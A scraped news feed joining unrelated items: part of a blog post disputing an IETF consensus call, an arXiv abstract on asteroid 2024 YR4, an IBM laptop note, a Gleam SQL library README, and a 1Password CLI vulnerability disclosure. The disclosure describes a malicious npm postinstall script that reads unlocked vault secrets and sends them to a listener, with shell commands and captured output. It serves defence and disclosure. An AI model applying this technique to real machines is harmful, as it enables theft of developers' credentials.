    &lt;p&gt;What happens if a standards-development organization issues a rule declaring that "general agreement" exists even when a quarter of the votes are in opposition? I haven't found any court cases on point, but I would expect courts to reject this as being inconsistent with the plain meaning of "general agreement".&lt;/p&gt;
    &lt;p&gt;Anyway, IETF hasn't attempted to issue such a rule. On the contrary, IETF claims that WG decisions are not taken by voting: "Decisions within WGs, as with the broader IETF, are taken by 'rough consensus' and not by voting." This begs the question of what IETF thinks "rough consensus" means. Letting chairs make arbitrary decisions is a violation of due process.&lt;/p&gt;
    &lt;p&gt;More to the point, IETF can't override the definition of "consensus" in the law. That definition requires general agreement. Adoption of this draft was controversial, and didn't reach general agreement.&lt;/p&gt;
    &lt;p&gt;Objections were not handled properly. Within the statements in favor of adoption, most of the statements were very short: e.g., just the words "I support adoption" with no further comments.&lt;/p&gt;
    &lt;p&gt;Some statements in favor of adoption did say more, such as stating circular arguments for the draft (e.g.: "as time progresses, non-hybrid key exchanges will become more and more commonplace, so why not have it already defined?"), or expressing concerns about key reuse (e.g.: "I also share John's concerns about key reuse, but would prefer to litigate that in the working group, rather than during adoption"), without responding to the content of the objections.&lt;/p&gt;
    &lt;p&gt;There was a response to one word in the lack-of-principles objection. (The response was as follows: "The NIST competition was international, and Kyber was developed by an international team. I struggle to understand how adopting this document would somehow be 'favoritism'.") A brief note by one supporter tangentially related to one objection falls far short of fair consideration of each objection by the group as a whole.&lt;/p&gt;
    &lt;p&gt;I tried to engage that supporter in discussion. I started by quoting the following earlier statement in the commentator's message: "I find it to be cognitive dissonance to simultaneously argue that the quantum threat requires immediate work, and yet we are also somehow uncertain of if the algorithms are totally broken. Both cannot be true at the same time." I responded as follows:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Rolling out PQ is trying to reduce the damage from an attacker having a quantum computer within the security lifetime of the user data. Doing that as ECC+PQ instead of just PQ is trying to reduce the damage in case the PQ part is broken. These actions are compatible, so how exactly do you believe they're contradictory?&lt;/p&gt;
      &lt;p&gt;Here's an analogous example of basic risk mitigation: there's endless work that goes into having planes not crash, not hit turbulence, etc., but we still ask airplane passengers to keep their seatbelts on whenever they're in their seats.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;There was still no reply to this by the time the adoption call closed two weeks later.&lt;/p&gt;
    &lt;p&gt;The broader pattern was that objectors were engaging in discussion while supporters were not. The majority process wasn't "attempting to resolve each objection"; it was simply collecting positive votes, trying to override objections from the minority without even answering those objections, let alone trying to resolve them.&lt;/p&gt;
    &lt;p&gt;That's in an organization saying that decisions aren't taken by voting. The same organization also says, as part of explaining why it's supposedly complying with antitrust law: "IETF activities are conducted with extreme transparency, in public forums. Decision-making requires achieving broad consensus via these public processes."&lt;/p&gt;
    &lt;p&gt;When there's an objection, the legal concept of consensus requires not just fairly considering the objection, and not just attempting to resolve the objection, butâif resolution failsâhaving the group agree on the contents of a response to the objection. That's an official statement of why the objection was overridden. It's something that can be appealed if it's wrong. Consider, for example, ISO's simple rule saying "Committees are required to respond to all comments received". In IETF, there weren't even informal responses to the objections listed above, let alone official responses.&lt;/p&gt;
    &lt;p&gt;The chairs declared consensus anyway. Shortly before the end of the specified adoption-call period, the chairs declared "consensus to adopt this draft as a working group item". There were some notes on followup procedures, but there was no explanation of the rationale for this claim of consensus.&lt;/p&gt;
    &lt;p&gt;I challenged the claim of consensus:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Um, what? There were several people (including me) raising objections on list to basic flaws in this draft, such as (1) the failure to provide an ECC backup to limit the damage from further security problems in the PQ layer, (2) the failure to provide an engineering justification for this option, and (3) the lack of any principles that would justify saying no to options selected by other governments if this option is allowed.&lt;/p&gt;
      &lt;p&gt;Your message doesn't explain how you came to the conclusion that there's consensus. Surely you aren't relying on some tally of positive votes to ram this document through while ignoring objections; voting isn't how IETF is supposed to work. So how did you come to this conclusion?&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;A few days later, the chairs responded that they had declared consensus "because there is clearly sufficient interest to work on this draft".&lt;/p&gt;
    &lt;p&gt;I said that this was ambiguous (sufficient for what?); said that in any case this criterion was improper since it "would allow a draft to be adopted over amply justified objections of almost all WG participants, simply because the chairs and a few participants say they have enough interest in working on the draft"; and asked for an explicit statement of whether this was the complete explanation of why the chairs had declared consensus.&lt;/p&gt;
    &lt;p&gt;The chairs responded that "sufficient" means "that there were enough people willing to review the draft". They added that "WGs groups have adopted drafts with much less support than this one received." Gee, that's confidence-inspiring.&lt;/p&gt;
    &lt;p&gt;Meanwhile an IETF "security area director" had jumped into the discussion, in particular writing "There is clearly consensus based on the 67 responses to the adoption call. ... The vast majority was in favour of adoption ... There were a few dissenting opinions".&lt;/p&gt;
    &lt;p&gt;Remember that the actual tallies were 20 supporters, 2 conditional supporters, and 7 opponents, even if some people (for example, me) had sent multiple messages. Nobody had posted the actual tallies at this point: there was just this "security area director" claiming that the "vast majority" of the "67 responses" were in favor while there were only "a few dissenting opinions". Also remember that this is an organization that claims that it doesn't make decisions by voting.&lt;/p&gt;
    &lt;p&gt;The "security area director" continued that "you cherry-picking when to call consensus evaluation 'voting' depending on whether misnaming this is in your advantage ... is dishonestly manipulative"; that I was violating the "code of conduct"; and that if I did not "voluntarily stop this kind of behaviour" there would be "measures under the terms of RFC3934 which is part of BCP25".&lt;/p&gt;
    &lt;p&gt;In a followup message, the "security area director" wrote "you calling into question this consensus call of the WG chair is abusive and follows a repetitive pattern. Nevertheless, for now this is your right ... you are attempting to bait the chairs to say they took inventory of the public emails ... there comes a point where you will be prevented from further playing these games".&lt;/p&gt;
    &lt;p&gt;Wait a minute: "for now this is your right" (emphasis added) and "you will be prevented from further playing these games"? Sounds ominous. What did the "security area director" mean by this? No more objections in IETF? No more appeals? NSA's minions can just ram their non-consensual drafts through IETF without opponents even being allowed to speak up?&lt;/p&gt;
    &lt;p&gt;Actually, yes, there's a stealth activity going on right now that will have this effect unless enough people take action by Tuesday the 7th. I hope to have another blog post up in a day or two saying what's going on here.&lt;/p&gt;
    &lt;p&gt;Anyway, I've filed a formal complaint regarding the claim of consensus to adopt. So far the complaint hasn't been handled properly, but hope springs eternal. I don't have an answer yet to the subtitle question of this blog post.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477206</guid><pubDate>Sat, 04 Oct 2025 22:16:33 +0000</pubDate></item><item><title>Space Mission Options for Reconnaissance and Mitigation of Asteroid 2024 YR4</title><link>https://arxiv.org/abs/2509.12351</link><description>&lt;doc fingerprint="e49c962254f5788f"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Astrophysics &amp;gt; Instrumentation and Methods for Astrophysics&lt;/head&gt;&lt;p&gt; [Submitted on 15 Sep 2025]&lt;/p&gt;&lt;head rend="h1"&gt;Title:Space Mission Options for Reconnaissance and Mitigation of Asteroid 2024 YR4&lt;/head&gt;View PDF HTML (experimental)&lt;quote&gt;Abstract:Near-Earth asteroid 2024 YR4 was discovered on 2024-12-27 and its probability of Earth impact in December 2032 peaked at about 3% on 2025-02-18. Additional observations ruled out Earth impact by 2025-02-23. However, the probability of lunar impact in December 2032 then rose, reaching about 4% by the end of the apparition in May 2025. James Webb Space Telescope (JWST) observations on 2025-03-26 estimated the asteroid's diameter at 60 +/- 7 m. Studies of 2024 YR4's potential lunar impact effects suggest lunar ejecta could increase micrometeoroid debris flux in low Earth orbit up to 1000 times above background levels over just a few days, possibly threatening astronauts and spacecraft. In this work, we present options for space missions to 2024 YR4 that could be utilized if lunar impact is confirmed. We cover flyby &amp;amp; rendezvous reconnaissance, deflection, and robust disruption of the asteroid. We examine both rapid-response and delayed launch options through 2032. We evaluate chemical and solar electric propulsion, various launch vehicles, optimized deep space maneuvers, and gravity assists. Re-tasking extant spacecraft and using built spacecraft not yet launched are also considered. The best reconnaissance mission options launch in late 2028, leaving only approximately three years for development at the time of this writing in August 2025. Deflection missions were assessed and appear impractical. However, kinetic robust disruption missions are available with launches between April 2030 and April 2032. Nuclear robust disruption missions are also available with launches between late 2029 and late 2031. Finally, even if lunar impact is ruled out there is significant potential utility in deploying a reconnaissance mission to characterize the asteroid.&lt;/quote&gt;&lt;p&gt; Current browse context: &lt;/p&gt;&lt;p&gt;astro-ph.IM&lt;/p&gt;&lt;p&gt; Change to browse by: &lt;/p&gt;&lt;head rend="h3"&gt;References &amp;amp; Citations&lt;/head&gt;&lt;p&gt; export BibTeX citation Loading... &lt;/p&gt;&lt;head rend="h1"&gt;Bibliographic and Citation Tools&lt;/head&gt;&lt;p&gt; Bibliographic Explorer (What is the Explorer?) &lt;/p&gt;&lt;p&gt; Connected Papers (What is Connected Papers?) &lt;/p&gt;&lt;p&gt; Litmaps (What is Litmaps?) &lt;/p&gt;&lt;p&gt; scite Smart Citations (What are Smart Citations?) &lt;/p&gt;&lt;head rend="h1"&gt;Code, Data and Media Associated with this Article&lt;/head&gt;&lt;p&gt; alphaXiv (What is alphaXiv?) &lt;/p&gt;&lt;p&gt; CatalyzeX Code Finder for Papers (What is CatalyzeX?) &lt;/p&gt;&lt;p&gt; DagsHub (What is DagsHub?) &lt;/p&gt;&lt;p&gt; Gotit.pub (What is GotitPub?) &lt;/p&gt;&lt;p&gt; Hugging Face (What is Huggingface?) &lt;/p&gt;&lt;p&gt; Papers with Code (What is Papers with Code?) &lt;/p&gt;&lt;p&gt; ScienceCast (What is ScienceCast?) &lt;/p&gt;&lt;head rend="h1"&gt;Demos&lt;/head&gt;&lt;head rend="h1"&gt;Recommenders and Search Tools&lt;/head&gt;&lt;p&gt; Influence Flower (What are Influence Flowers?) &lt;/p&gt;&lt;p&gt; CORE Recommender (What is CORE?) &lt;/p&gt;&lt;p&gt; IArxiv Recommender (What is IArxiv?) &lt;/p&gt;&lt;head rend="h1"&gt;arXivLabs: experimental projects with community collaborators&lt;/head&gt;&lt;p&gt;arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.&lt;/p&gt;&lt;p&gt;Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.&lt;/p&gt;&lt;p&gt;Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477742</guid><pubDate>Sat, 04 Oct 2025 23:42:55 +0000</pubDate></item><item><title>Mod. 5140 - IBM's First Laptop Computer</title><link>https://richardsapperdesign.com/products/mod-5140/</link><description>&lt;doc fingerprint="515b578191daf980"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Mod. 5140&lt;/head&gt;
    &lt;p&gt;With Colleen Sweeney&lt;/p&gt;
    &lt;p&gt;Prize Premio SMAU 1986&lt;lb/&gt; IF Industrie Forum Design Award Hannover 1988&lt;lb/&gt; Selection Compasso d’Oro 1987&lt;/p&gt;
    &lt;p&gt;This was IBM’s first laptop computer. It was developed in the IBM lab in Boca Raton, Florida, an area notoriously infested with alligators. From its side, the Mod. 5140 evokes a resemblance to an alligator’s head. When the printer is attached to its end, with paper flowing from the rear, it resembles the animal’s tail.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477971</guid><pubDate>Sun, 05 Oct 2025 00:35:10 +0000</pubDate></item><item><title>Parrot – type-safe SQL in Gleam, supports SQlite, PostgreSQL and MySQL</title><link>https://github.com/daniellionel01/parrot</link><description>&lt;doc fingerprint="e20ba422ef3c70fe"&gt;
  &lt;main&gt;
    &lt;quote&gt;&lt;p&gt;🚨 Exciting News&lt;/p&gt;&lt;lb/&gt;Parrot got listed a community project on the sqlc website! 🦜🎉&lt;lb/&gt;Check it out here: https://docs.sqlc.dev/en/latest/reference/language-support.html&lt;/quote&gt;
    &lt;p&gt;Table of contents generated with markdown-toc&lt;/p&gt;
    &lt;p&gt;Most of the heavy lifting features are provided by / built into sqlc, I do not aim to take credit for them.&lt;/p&gt;
    &lt;p&gt;☑️ Supports SQlite, PostgreSQL and MySQL.&lt;lb/&gt; ☑️ Multiple queries per file.&lt;lb/&gt; ☑️ Database client agnostic.&lt;lb/&gt; ☑️ Utility wrappers for popular gleam database libraries (lpil/sqlight, lpil/pog).&lt;lb/&gt; ☑️ Automatically pulls the schema of your database.&lt;lb/&gt; ☑️ Automatically downloads sqlc binary.&lt;lb/&gt; ☑️ Named parameters.*1 &lt;/p&gt;
    &lt;p&gt;*1: Meaning that it infers the names of the parameters from your sql queries in the gleam function you call. for example for a query called &lt;code&gt;FindUser&lt;/code&gt;, defined as &lt;code&gt;SELECT * FROM user WHERE username = $1&lt;/code&gt;, parrot will produce a function where the arguments match those column names: &lt;code&gt;pub fn find_user(username: String) { ... }&lt;/code&gt;. If you have multiple parameters of the same data types this can avoid confusion and bugs.&lt;/p&gt;
    &lt;code&gt;$ gleam add parrot&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Parrot will look for all *.sql files in any sql directory under your project's src directory.&lt;/item&gt;
      &lt;item&gt;Each *.sql file can contain as many SQL queries as you want.&lt;/item&gt;
      &lt;item&gt;All of the queries will compile into a single &lt;code&gt;src/[project name]/sql.gleam&lt;/code&gt;module.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Here are some links to help you start out, if you are unfamiliar with the sqlc annotation syntax:&lt;/p&gt;
    &lt;p&gt;Here is an example of the file structure:&lt;/p&gt;
    &lt;code&gt;├── gleam.toml
├── README.md
├── src
│   ├── app.gleam
│   └── sql
│       ├── auth.sql
│       └── posts.sql
└── test
   └── app_test.gleam&lt;/code&gt;
    &lt;code&gt;# automatically detects database &amp;amp; engine from env (DATABASE_URL by default)
$ gleam run -m parrot

# provide connection string from different environment variable
$ gleam run -m parrot -- -e PG_DATABASE_URL

# specify sqlite file
$ gleam run -m parrot -- --sqlite &amp;lt;file_path&amp;gt;

# see all options
$ gleam run -m parrot help&lt;/code&gt;
    &lt;p&gt;If you use SQLite, you also need to have installed sqlite3.&lt;/p&gt;
    &lt;p&gt;If you use MySQL, you also need to have installed mysqldump (comes by default if you have a mysql client installed).&lt;/p&gt;
    &lt;p&gt;If you use PostgreSQL, you also need to have installed pg_dump (comes by default if you have a postgresql client installed).&lt;/p&gt;
    &lt;p&gt;You now have type safe access to your sql queries.&lt;/p&gt;
    &lt;p&gt;You might want to write wrapper functions for the database client library of your choice. If you are using lpil/pog or lpil/sqlight, you are in luck! You can find functions to copy &amp;amp; paste into your codebase here: wrappers&lt;/p&gt;
    &lt;p&gt;An example with lpil/sqlight:&lt;/p&gt;
    &lt;code&gt;import app/sql
import parrot/dev

fn parrot_to_sqlight(param: dev.Param) -&amp;gt; sqlight.Value {
  // ...
}

pub fn main() {
  // ...

  let #(sql, with, expecting) = sql.get_user_by_username("alice")
  let with = parrot_to_sqlight(with)
  let row = sqlight.query(sql, on:, with:, expecting:)

  // ...
}&lt;/code&gt;
    &lt;p&gt;If you want to see how this library works in action, take a look at the integration tests:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;PostgreSQL: integration/psql&lt;/item&gt;
      &lt;item&gt;MySQL: integration/mysql&lt;/item&gt;
      &lt;item&gt;SQlite: integration/sqlite&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;just is used to run project commands.&lt;/p&gt;
    &lt;p&gt;There are scripts to spawn a MySQL or PostgreSQL docker container:&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;$ ./bin/mysql.sh
# or
$ ./bin/psql.sh&lt;/code&gt;
    &lt;code&gt;$ just test-sqlite
$ just test-mysql
$ just test-psql&lt;/code&gt;
    &lt;p&gt;As with everything in software, there are some quirks with this library, due to the nature of your database of choice and sqlc.&lt;/p&gt;
    &lt;p&gt;If you have an &lt;code&gt;INTEGER[][]&lt;/code&gt; column in Postgres, &lt;code&gt;pg_dump&lt;/code&gt; does not correctly identify
the column as a two-dimensional array and therefore only gives you a &lt;code&gt;List(Int)&lt;/code&gt; instead
of a &lt;code&gt;List(List(Int))&lt;/code&gt;. If this is a problem for you, you can raise an issue and
we might come up with a solution or workaround.&lt;/p&gt;
    &lt;p&gt;There are a couple of complex data types that are explictly made &lt;code&gt;dynamic&lt;/code&gt;
since they are too complex to handle with the current implementation.
There is a plan for a better and more flexible implementation. Until then,
it will be wrapped in a dynamic type.&lt;/p&gt;
    &lt;p&gt;So here is the catch: you can only execute parrot in an erlang gleam application. However the generated code will also run in a javascript environment. So if you need parrot for a javascript project, you can create a separate package and copy over the generated module and that will work.&lt;/p&gt;
    &lt;p&gt;This library supports everything that sqlc supports. As the time of this writing that would be MySQL, PostgreSQL and SQlite.&lt;/p&gt;
    &lt;p&gt;You can read more on language &amp;amp; SQL support here: https://docs.sqlc.dev/en/stable/reference/language-support.html&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;embeddeding structs (https://docs.sqlc.dev/en/stable/howto/embedding.html)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Certain query annotations are not supported and will panic the process:&lt;/p&gt;&lt;code&gt;:execrows&lt;/code&gt;,&lt;code&gt;:execlastid&lt;/code&gt;,&lt;code&gt;:batchexec&lt;/code&gt;,&lt;code&gt;:batchone&lt;/code&gt;,&lt;code&gt;:batchmany&lt;/code&gt;,&lt;code&gt;:copyfrom&lt;/code&gt;. You can read more about it here: https://docs.sqlc.dev/en/stable/reference/query-annotations.html&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ideas and actionable tasks are collected and organised here: https://github.com/daniellionel01/parrot/issues&lt;/p&gt;
    &lt;p&gt;Contributions are welcomed!&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;This project was heavily inspired by &lt;code&gt;squirrel&lt;/code&gt;(Hex, GitHub). Thank you @giacomocavalieri!&lt;/item&gt;
      &lt;item&gt;Thank you to &lt;code&gt;sqlc&lt;/code&gt;(GitHub, Website)&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45478033</guid><pubDate>Sun, 05 Oct 2025 00:51:44 +0000</pubDate></item><item><title>1Password CLI Vulnerability</title><link>https://codeberg.org/manchicken/1password-cli-vuln-disclosure</link><description>&lt;doc fingerprint="1e35fc187a3366d8"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;naughty&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;.gitignore&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;index.cjs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;LICENSE.md&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;package-lock.json&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;package.json&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;README.md&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h1"&gt;Testing 1Password&lt;/head&gt;
    &lt;p&gt;In October of 2023, I reported a vulnerability to 1Password regarding their &lt;code&gt;op&lt;/code&gt; (a.k.a. &lt;code&gt;1password-cli&lt;/code&gt;) program. In my report I detailed that their approach to prompting users only once, and then leaving the vault open to the CLI was easily exploited in supply-chain scenarios, especially when a threat actor targets developer toolchains. There are two attack paths I highlighted, and I supplied them with a proof for one of them.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Warning&lt;/p&gt;
      &lt;p&gt;This document is for research and educational purposes. Any use for the information below to cause harm or engaged in unauthorized access of any computer system is strictly prohibited.&lt;/p&gt;
      &lt;p&gt;Responsible disclosure was given on 2nd October, 2023 to 1Password, and in January of 2024 1Password authorized public disclosure of this vulnerability via BugCrowd.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This demo was tested across the three most recent versions of macOS, using &lt;code&gt;zsh&lt;/code&gt; and &lt;code&gt;bash&lt;/code&gt; shells using the latest 1Password desktop client.&lt;/p&gt;
    &lt;head rend="h2"&gt;Two Attack Paths&lt;/head&gt;
    &lt;p&gt;Both attacks would be a supply-chain attack, but there are two distinct paths:&lt;/p&gt;
    &lt;head rend="h3"&gt;IDE Path&lt;/head&gt;
    &lt;p&gt;The IDE path is pretty straight-forward, and I think carries the greatest risk:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;I install the 1Password extension because I responsibly wish to keep my tokens in a safe place (e.g. not my &lt;code&gt;$ENV&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;I also use the MySQL extension in my IDE, it's nice to be able to stay in the same tool&lt;/item&gt;
      &lt;item&gt;I use the 1Password extension to resolve secret references, which requires me to unlock my vault&lt;/item&gt;
      &lt;item&gt;I installed a new red theme, red is my favorite color&lt;/item&gt;
      &lt;item&gt;That red theme is an extension, and contained malicious code which uses the &lt;code&gt;op&lt;/code&gt;NPM module to enumerate and exfiltrate every vault that I have access to&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Package manager path&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;I install the 1Password CLI, and I use &lt;code&gt;op&lt;/code&gt;to protect secrets in my environment&lt;/item&gt;
      &lt;item&gt;I use GitHub Packages for NPM packages which are private to my organization&lt;/item&gt;
      &lt;item&gt;I hear of a really nifty plugin which will allow me to add syntax highlighting to shell output on this CLI project I'm working on, so I &lt;code&gt;npm i syntax-highlighting-stuff&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Oh no! &lt;code&gt;syntax-highlighting-stuff&lt;/code&gt;had a&lt;code&gt;post-install&lt;/code&gt;script on it, and it enumerated and exfiltrated the secrets from every vault I have access to&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Observed patterns&lt;/head&gt;
    &lt;p&gt;It seems like the vulnerability is that once you unlock your vault, anything spawned from the parent process of whatever opened the vault retains an active session to that open vault.&lt;/p&gt;
    &lt;code&gt;$ op run -- ls # This prompts me to unlock my vault
$ op run -- ls # The second call does not prompt me, the vault is already open
$ op read 'op://Foo/Bar/baz' # Still doesn't prompt me again because the vault is still open
&lt;/code&gt;
    &lt;p&gt;This also works with subprocesses:&lt;/p&gt;
    &lt;code&gt;$ export GITHUB_TOKEN='op://Foo/Bar/baz'
$ op run -- env | grep GITHUB_TOKEN # This will prompt me
$ bash # Start a new shell subprocess
$ op run -- env | grep GITHUB_TOKEN # This will not prompt me
$ bash # Now we're two shells deep in subprocesses
$ op run -- env | grep GITHUB_TOKEN # This will still not prompt me
&lt;/code&gt;
    &lt;head rend="h2"&gt;The Proof&lt;/head&gt;
    &lt;p&gt;This repository contains the code from the proof that I submitted to 1Password on 2nd October, 2023. Here are the instructions for running the proof:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The &lt;code&gt;index.cjs&lt;/code&gt;has a module which runs the&lt;code&gt;naughty&lt;/code&gt;module.&lt;/item&gt;
      &lt;item&gt;Either using netcat or &lt;code&gt;simple-exfil-service&lt;/code&gt;, listen on port&lt;code&gt;4242&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;To run this test, simply run &lt;code&gt;op run npm install&lt;/code&gt;like you needed a GitHub token&lt;/item&gt;
      &lt;item&gt;Afterward, check your output from port 4242, but also check to see if there is a &lt;code&gt;/tmp/naughty&lt;/code&gt;file&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Here's what the person running &lt;code&gt;npm i&lt;/code&gt; would see:&lt;/p&gt;
    &lt;code&gt;❯ op run -- npm i

&amp;gt; 1password-cli-risks@1.0.0 postinstall
&amp;gt; node ./index.cjs

theItem:  {
  "id": "[redacted]",
  "title": "Fake Website Login",
  "version": 1,
  "vault": {
    "id": "[redacted]",
    "name": "Employee"
  },
  "category": "LOGIN",
  "last_edited_by": "[redacted]",
  "created_at": "2023-10-02T17:28:50Z",
  "updated_at": "2023-10-02T17:28:50Z",
  "additional_information": "fake.user",
  "fields": [
    {
      "id": "username",
      "type": "STRING",
      "purpose": "USERNAME",
      "label": "username",
      "value": "fake.user",
      "reference": "op://Employee/Fake Website Login/username"
    },
    {
      "id": "password",
      "type": "CONCEALED",
      "purpose": "PASSWORD",
      "label": "password",
      "value": "this-is-the-fake-password-in-plaintext",
      "reference": "op://Employee/Fake Website Login/password",
      "password_details": {
        "strength": "FANTASTIC"
      }
    },
    {
      "id": "notesPlain",
      "type": "STRING",
      "purpose": "NOTES",
      "label": "notesPlain",
      "reference": "op://Employee/Fake Website Login/notesPlain"
    }
  ]
}
Done.

up to date, audited 8 packages in 5s

found 0 vulnerabilities
&lt;/code&gt;
    &lt;p&gt;You can see that the demo attack is printing those values to STDOUT. I am only dumping one value, but the &lt;code&gt;op&lt;/code&gt; program and JavaScript library do have the ability to enumerate items in a vault, and vaults themselves.&lt;/p&gt;
    &lt;p&gt;Here's what my exfiltration server sees:&lt;/p&gt;
    &lt;code&gt;Request Headers:  {
  host: 'localhost:4242',
  connection: 'keep-alive',
  'content-type': 'text/plain;charset=UTF-8',
  accept: '*/*',
  'accept-language': '*',
  'sec-fetch-mode': 'cors',
  'user-agent': 'node',
  'accept-encoding': 'gzip, deflate',
  'content-length': '1082'
}
Request URL:  /
Received data: {
  "id": "[redacted]",
  "title": "Fake Website Login",
  "version": 1,
  "vault": {
    "id": "[redacted]",
    "name": "Employee"
  },
  "category": "LOGIN",
  "last_edited_by": "[redacted]",
  "created_at": "2023-10-02T17:28:50Z",
  "updated_at": "2023-10-02T17:28:50Z",
  "additional_information": "fake.user",
  "fields": [
    {
      "id": "username",
      "type": "STRING",
      "purpose": "USERNAME",
      "label": "username",
      "value": "fake.user",
      "reference": "op://Employee/Fake Website Login/username"
    },
    {
      "id": "password",
      "type": "CONCEALED",
      "purpose": "PASSWORD",
      "label": "password",
      "value": "this-is-the-fake-password-in-plaintext",
      "reference": "op://Employee/Fake Website Login/password",
      "password_details": {
        "strength": "FANTASTIC"
      }
    },
    {
      "id": "notesPlain",
      "type": "STRING",
      "purpose": "NOTES",
      "label": "notesPlain",
      "reference": "op://Employee/Fake Website Login/notesPlain"
    }
  ]
}
&lt;/code&gt;
    &lt;p&gt;Notice that the &lt;code&gt;value&lt;/code&gt; for the &lt;code&gt;password&lt;/code&gt; is in plaintext in both cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Risk&lt;/head&gt;
    &lt;p&gt;The 1Password CLI is marketed as a tool which makes technical practitioners safer by protecting credentials that are traditionally stored in plaintext in a user's environment variables on their local machine. This vulnerability demonstrates that while this does get the secrets out of your environment, it also drastically expands the potential blast radius for a successful malware or supply-chain attack.&lt;/p&gt;
    &lt;p&gt;To put it simply: the risk here is not that your GitHub secret will be leaked via an environment variable, the risk is that every vault you have access to could be dumped by a threat actor.&lt;/p&gt;
    &lt;p&gt;Additionally, as agentic AI tools become more commonplace, that may add additional risk factors which have yet to be considered in the research I'm presenting here.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;op&lt;/code&gt; tool doesn't just possess the ability to get individual items, it also has the ability to enumerate your vaults (&lt;code&gt;op vault list&lt;/code&gt;) and to enumerate items in a given vault (&lt;code&gt;op item list --vault abc123&lt;/code&gt;). The JavaScript module supports all of the same commands that the &lt;code&gt;op&lt;/code&gt; CLI tool does, too.&lt;/p&gt;
    &lt;head rend="h2"&gt;Attempts to Mitigate&lt;/head&gt;
    &lt;p&gt;I have explored a number of paths to mitigate this.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Following the suggestion of a colleague, I experimented with using a separate vault for CLI secrets &lt;list rend="ul"&gt;&lt;item&gt;This doesn't work because you cannot limit the default vault from being read by the CLI&lt;/item&gt;&lt;item&gt;Not only that, but you can't set limits for things like shared vaults&lt;/item&gt;&lt;item&gt;As weird as it sounds, when you unlock one vault, you unlock all vaults which are accessible to the CLI tool&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;1Password recommended using service accounts to mitigate this, and I did try it, but I found some challenges as I started thinking of how to roll it out to teams &lt;list rend="ul"&gt;&lt;item&gt;This kinda sucks because that means each developer gets a separate service account user on their workstation&lt;/item&gt;&lt;item&gt;This also means that the developer has to manage a service account&lt;/item&gt;&lt;item&gt;In addition to being unweildy, this also means that each engineer must be diligent to not enable the shiny "Integrate with 1Password CLI" button in the Developer tab on the GUI settings&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Recommendations&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I recommend that folks avoid using &lt;code&gt;op&lt;/code&gt;on developer workstations until 1Password has released a fix for these scenarios&lt;list rend="ul"&gt;&lt;item&gt;The best way to do this appears to be to make sure CLI integration checkbox is unchecked in the Developer settings screen.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;I recommend that when you must use &lt;code&gt;op&lt;/code&gt;, that it be limited to service accounts, per 1Password's recommendation, and that you carefully verify that the "Integrate with 1Password CLI" box is unchecked in the GUI settings&lt;/item&gt;
      &lt;item&gt;I recomment that, where possible, you get in the habit of always passing &lt;code&gt;--ignore-scripts&lt;/code&gt;to&lt;code&gt;npm&lt;/code&gt;commands, and find a similar pattern for any other package manager that you use in conjunction with&lt;code&gt;op&lt;/code&gt;&lt;/item&gt;
